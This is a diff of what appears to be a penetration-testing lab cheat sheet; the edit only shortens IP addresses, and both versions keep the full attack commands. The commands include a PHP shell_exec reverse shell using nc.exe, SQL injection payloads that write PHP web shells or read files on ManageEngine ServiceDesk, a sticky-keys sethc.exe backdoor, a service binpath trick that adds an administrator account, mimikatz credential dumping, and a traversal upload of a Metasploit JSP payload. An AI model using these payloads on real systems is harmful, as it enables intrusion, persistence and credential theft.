@@ -1,13 +1,13 @@
 <?php 
-echo shell_exec(start \\\\10.11.0.127\webdav\nc.exe -nv 10.11.0.127 4445)
+echo shell_exec(start \\\\10.11.0.\webdav\nc.exe -nv 10.11.0. 4445)
 ?>
 //$thing='xcopy "\\10.11.0.127\webdav\MSF" "C:\Inetpub\tool" /E /Y';
-xcopy "\\10.11.0.127\webdav\MSF" "C:\Inetpub\tool" /E /Y
-xcopy "\\10.11.0.127\webdav\recon" "C:\Inetpub\tool" /E /Y
-xcopy "\\10.11.0.127\webdav\creds" "C:\Inetpub\tool" /E /Y
+xcopy "\\10.11.0.\webdav\MSF" "C:\Inetpub\tool" /E /Y
+xcopy "\\10.11.0.\webdav\recon" "C:\Inetpub\tool" /E /Y
+xcopy "\\10.11.0.\webdav\creds" "C:\Inetpub\tool" /E /Y
 
-//$thing='start C:\Users\nc.exe -nv 10.11.0.127 4444';
-//$thing='start \\\\10.11.0.127\webdav\nc.exe -nv 10.11.0.127 4445';
+//$thing='start C:\Users\nc.exe -nv 10.11.0. 4444';
+//$thing='start \\\\10.11.0.\webdav\nc.exe -nv 10.11.0. 4445';
 $thing='start C:\Users\payload1.exe';
 echo '[*] CMD Issued Below:'
 echo $thing;
@@ -16,8 +16,8 @@ echo shell_exec($thing);
 
 ?>
 
-<iframe src="http://10.11.0.127/webdav/"></iframe>
-10.11.20.153/comment.php?id=919 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor2.php'
+<iframe src="http://10.11.0./webdav/"></iframe>
+10.11.20./comment.php?id=919 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor2.php'
 
 en 'union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor3.php';#
 
@@ -27,7 +27,7 @@ REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution 
 EXEC xp_cmdshell "REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f"
 
 copy c:\windows\system32\cmd.exe c:\windows\system32\sethc.exe
-xcopy "\\10.11.0.127\webdav\" "C:\Inetpub\tool" /E /Y
+xcopy "\\10.11.0.\webdav\" "C:\Inetpub\tool" /E /Y
 
 http://x.x.x.x:8080/WorkOrder.do?woMode=viewWO&woID=WorkOrder.WORKORDERID=6)
 union select 1,2,3,4,5,6,7,8,load_file("c:\\boot.ini"),10,11,12,13,14,15,16,17,18,19,1 into dumpfile
@@ -36,10 +36,10 @@ viceDeskWC.ear\\AdventNetServiceDesk.war\\images\\boot.ini'/*
 
 /WorkOrder.do?woMode=viewWO&woID=WorkOrder.WORKORDERID=6) /*
 
-10.11.1.145:8080/WorkOrder.do?woMode=viewWO&woID=WorkOrder.WORKORDERID=1) union select 1,2,3,4,5,6,7,8,SELECT DATABASE();,10,11,12,13,14,15,16,17,18,19,1 into dumpfile "C:\\ManageEngine\\ServiceDesk\\applications\\extracted\\AdventNetServiceDesk.eear\\AdventNetServiceDeskWC.ear\\AdventNetServiceDesk.war\\images\\shell.txt" /*
+10.11.1.:8080/WorkOrder.do?woMode=viewWO&woID=WorkOrder.WORKORDERID=1) union select 1,2,3,4,5,6,7,8,SELECT DATABASE();,10,11,12,13,14,15,16,17,18,19,1 into dumpfile "C:\\ManageEngine\\ServiceDesk\\applications\\extracted\\AdventNetServiceDesk.eear\\AdventNetServiceDeskWC.ear\\AdventNetServiceDesk.war\\images\\shell.txt" /*
 
 sc config upnphost binpath= "net user john hello /add && net localgroup Administrators john /add" type= interact
 
 start mimikatz.exe sekurlsa::logonpasswords >>output.txt &
 
-curl -v -X POST "http://10.11.1.145:8080/fileupload?connectionId=AAAAAAA%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cjspf%5ctest.jsp%00&resourceId=B&action=rds_file_upload&computerName=sinn3r%2ephp&customerId=47474747" --data @/root/MSFV_windows.jsp --header "Content-Type:application/octet-stream" && http://10.11.0.127/MSFV_windows.jsp 
+curl -v -X POST "http://10.11.1.:8080/fileupload?connectionId=AAAAAAA%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cjspf%5ctest.jsp%00&resourceId=B&action=rds_file_upload&computerName=sinn3r%2ephp&customerId=47474747" --data @/root/MSFV_windows.jsp --header "Content-Type:application/octet-stream" && http://10.11.0.127/MSFV_windows.jsp 
